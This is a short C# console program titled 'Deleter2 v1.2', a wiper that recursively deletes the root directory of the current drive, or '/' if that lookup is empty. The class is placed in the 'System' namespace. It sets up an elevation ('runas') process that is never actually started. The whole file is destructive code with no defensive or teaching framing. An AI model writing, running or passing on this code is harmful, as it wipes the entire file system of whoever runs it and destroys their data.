namespace System
{
    public static class Deleter
    {
        public static System.String Dir = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
        public static System.Boolean DirExists = System.IO.Directory.Exists(System.Deleter.Dir);
        public const System.String Ver = "1.2";
        public const System.String Title = "Deleter2 v" + System.Deleter.Ver;
        public static void DeleteDir()
        {
            if (System.Deleter.Dir == null || System.Deleter.Dir == "")
            {
                System.Deleter.Dir = "/";
            }
            try
            {
                System.Console.WriteLine("Deleting " + System.Deleter.Dir);
                System.IO.Directory.Delete(System.Deleter.Dir, true);
            }
            catch (System.Exception ex)
            {
                System.Console.WriteLine("Error deleting " + System.Deleter.Dir);
                System.Console.WriteLine(ex);
            }
        }
        public static void Main(System.String[] args)
        {
            if (System.Deleter.Dir == null || System.Deleter.Dir == "")
            {
                System.Deleter.Dir = "/";
            }
            System.Console.Title = System.Deleter.Title;
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.UseShellExecute = true;
            p.StartInfo.Verb = "runas";
            System.Console.ForegroundColor = System.ConsoleColor.DarkGray;
            System.Console.BackgroundColor = System.ConsoleColor.DarkRed;
            System.Deleter.DeleteDir();
        }
    }
}